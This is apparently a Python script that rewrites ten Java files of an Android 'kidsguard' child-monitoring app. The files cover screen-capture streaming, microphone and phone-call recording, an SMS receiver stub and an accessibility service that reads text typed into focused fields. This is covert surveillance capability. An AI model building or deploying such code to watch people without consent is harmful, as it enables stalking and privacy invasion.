import os
b = "app/src/main/java/com/kidsguard/child"

files = {}

files[f"{b}/ScreenStreamService.java"] = """package com.kidsguard.child;
import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
public class ScreenStreamService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification n = new NotificationCompat.Builder(this, "screen_channel").build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1002, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(1002, n);
        }
        return START_STICKY;
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
"""

files[f"{b}/WebInjectModule.java"] = """package com.kidsguard.child;
import android.os.Build;
import android.webkit.WebView;
import android.webkit.WebViewClient;
public class WebInjectModule {
    public void initWebView(WebView webView) {
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAllowFileAccess(false);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webView.getSettings().setAllowUniversalAccessFromFileURLs(false);
            webView.getSettings().setAllowFileAccessFromFileURLs(false);
        }
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                if (url != null && url.contains("kidsguard-internal")) {
                    view.addJavascriptInterface(new Object(), "AndroidBridge");
                }
            }
        });
    }
}
"""

files[f"{b}/AudioCapture.java"] = """package com.kidsguard.child;
import android.media.MediaRecorder;
import android.util.Log;
public class AudioCapture {
    private MediaRecorder recorder;
    private boolean isRecording = false;
    public void startRecording(String path) {
        if (isRecording) return;
        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(path);
            recorder.prepare(); recorder.start();
            isRecording = true;
        } catch (Exception e) { Log.e("Audio", "Start fail", e); release(); }
    }
    public void stopRecording() {
        if (!isRecording || recorder == null) return;
        try { recorder.stop(); } catch (RuntimeException e) { Log.w("Audio", "Stop fail", e); }
        finally { release(); }
    }
    private void release() {
        if (recorder != null) { recorder.reset(); recorder.release(); recorder = null; }
        isRecording = false;
    }
}
"""

files[f"{b}/CallRecorder.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.media.AudioAttributes;
import android.media.AudioFocusRequest;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Log;
public class CallRecorder {
    private MediaRecorder recorder;
    private AudioFocusRequest focusRequest;
    private Context ctx;
    public CallRecorder(Context c) { this.ctx = c.getApplicationContext(); }
    public void start(String path) {
        if (!requestFocus()) return;
        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(Build.VERSION.SDK_INT >= 29 ? MediaRecorder.AudioSource.VOICE_COMMUNICATION : MediaRecorder.AudioSource.VOICE_CALL);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(path);
            recorder.prepare(); recorder.start();
        } catch (Exception e) { Log.e("CallRec", "Fail", e); release(); }
    }
    private boolean requestFocus() {
        AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return false;
        if (Build.VERSION.SDK_INT >= 26) {
            focusRequest = new AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
                .setAudioAttributes(new AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION).build()).build();
            return am.requestAudioFocus(focusRequest) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED;
        }
        return true;
    }
    public void release() {
        if (recorder != null) { try { recorder.stop(); } catch (Exception ignored) {} recorder.release(); recorder = null; }
        if (Build.VERSION.SDK_INT >= 26 && focusRequest != null) {
            ((AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE)).abandonAudioFocusRequest(focusRequest);
        }
    }
}
"""

files[f"{b}/SmsReceiver.java"] = """package com.kidsguard.child;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        final PendingResult pr = goAsync();
        new Thread(() -> {
            try {
                Bundle b = intent.getExtras();
                if (b != null) { /* parse sms */ }
            } catch (Exception e) { Log.e("SmsRx", "Fail", e); }
            finally { pr.finish(); }
        }).start();
    }
}
"""

files[f"{b}/NotificationBuilder.java"] = """package com.kidsguard.child;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
public class NotificationBuilder {
    public PendingIntent getActionIntent(Context ctx, String action) {
        Intent i = new Intent(ctx, ActionReceiver.class);
        i.putExtra("action", action);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;
        return PendingIntent.getBroadcast(ctx, action.hashCode(), i, flags);
    }
}
"""

files[f"{b}/DashboardFragment.java"] = """package com.kidsguard.child;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import androidx.fragment.app.Fragment;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class DashboardFragment extends Fragment {
    private TextView tv;
    private final ExecutorService io = Executors.newSingleThreadExecutor();
    @Override
    public void onViewCreated(View v, Bundle s) {
        super.onViewCreated(v, s);
        tv = v.findViewById(R.id.device_id_text);
        io.execute(() -> {
            String id = requireActivity().getSharedPreferences("prefs", 0).getString("id", "Unknown");
            tv.post(() -> { if (isAdded()) tv.setText("Device: " + id); });
        });
    }
    @Override public void onDestroyView() { super.onDestroyView(); io.shutdownNow(); }
}
"""

files[f"{b}/SettingsFragment.java"] = """package com.kidsguard.child;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import androidx.fragment.app.Fragment;
public class SettingsFragment extends Fragment implements View.OnClickListener {
    @Override
    public void onViewCreated(View v, Bundle s) {
        super.onViewCreated(v, s);
        v.findViewById(R.id.btn_clear).setOnClickListener(this);
    }
    @Override
    public void onClick(View v) {
        if (v.getId() == R.id.btn_clear) clearData();
    }
    private void clearData() { /* impl */ }
}
"""

files[f"{b}/SyncScheduler.java"] = """package com.kidsguard.child;
import android.content.Context;
import androidx.work.ExistingWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
public class SyncScheduler {
    private final Context ctx;
    public SyncScheduler(Context c) { this.ctx = c.getApplicationContext(); }
    public void schedule() {
        OneTimeWorkRequest req = new OneTimeWorkRequest.Builder(SyncWorker.class).build();
        WorkManager.getInstance(ctx).enqueueUniqueWork("data_sync", ExistingWorkPolicy.KEEP, req);
    }
}
"""

files[f"{b}/UiAutomationService.java"] = """package com.kidsguard.child;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
public class UiAutomationService extends AccessibilityService {
    public void extractInput() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focus != null && focus.getText() != null) {
            processText(focus.getText().toString());
        }
        root.recycle();
    }
    private void processText(String t) { Log.d("UiAuto", t); }
    @Override public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent e) {}
    @Override public void onInterrupt() {}
}
"""

for p, c in files.items():
    with open(p, "w") as f: f.write(c)
print("10 files fixed.")
